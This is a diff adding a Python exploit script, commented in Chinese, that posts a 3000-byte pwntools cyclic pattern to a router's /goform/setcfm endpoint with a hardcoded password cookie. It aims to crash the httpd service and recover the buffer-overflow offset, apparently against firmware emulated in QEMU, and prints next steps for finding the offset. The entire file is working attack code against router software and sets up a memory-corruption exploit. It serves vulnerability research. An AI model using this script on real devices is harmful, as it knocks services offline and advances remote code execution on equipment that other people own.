@@ -1,1 +1,49 @@
+import requests
+from pwn import *
+from requests.exceptions import ConnectionError, ReadTimeout
 
+# 目标路由器信息
+IP = "192.168.252.136"
+PORT = 80
+URL = f"http://{IP}:{PORT}/goform/setcfm"
+
+# 1. 生成探测 Payload
+# 我们之前用 200 个 'A' 成功打崩了，现在生成 300 字节的有序字符
+# 它看起来像这样: aaaabaaacaaadaaaeaaaf...
+PAYLOAD_LEN = 3000
+pattern = cyclic(PAYLOAD_LEN).decode('utf-8') 
+
+# 2. 构造 HTTP 请求数据
+cookies = {
+    "password": "recmji"
+}
+
+data = {
+    "funcname": "save_list_data",
+    "funcpara1": pattern,  # 将测试字符注入到溢出点
+    "funcpara2": "12345~"  # 满足绕过长度和特殊字符的条件
+}
+
+print(f"[*] 准备发送探测 Payload (长度: {PAYLOAD_LEN} 字节)...")
+print(f"[*] Payload 预览: {pattern[:30]}...")
+
+try:
+    # 3. 发送攻击请求
+    # 设置 timeout 防止脚本因为服务端进程死亡而无限挂起
+    res = requests.post(URL, cookies=cookies, data=data, timeout=3)
+    print(f"[-] 警告：服务器正常返回了状态码 {res.status_code}，它没有崩溃？")
+
+except (ConnectionError, ReadTimeout) as e:
+    # 预期内的报错：进程死亡导致连接重置或超时
+    print("[+] 完美！连接异常中断，说明 httpd 进程已经被我们成功击杀。")
+    print("\n" + "="*50)
+    print("[🎯 下一步行动指南]")
+    print("1. 请立刻切换到运行 QEMU 的终端。")
+    print("2. 找到 Segmentation fault (段错误) 的报错信息。")
+    print("3. 找到出错时的程序计数器 (PC/epc) 或者返回地址 (RA) 寄存器的值（通常是类似 0x6161616a 的十六进制数）。")
+    print("4. 在宿主机终端运行命令： pwn cyclic -l 0x你看到的十六进制数")
+    print("   (例如: pwn cyclic -l 0x6161616a)")
+    print("5. pwntools 会告诉你精确的溢出偏移量！")
+    print("="*50)
+except Exception as e:
+    print(f"[-] 发生未知错误: {e}")
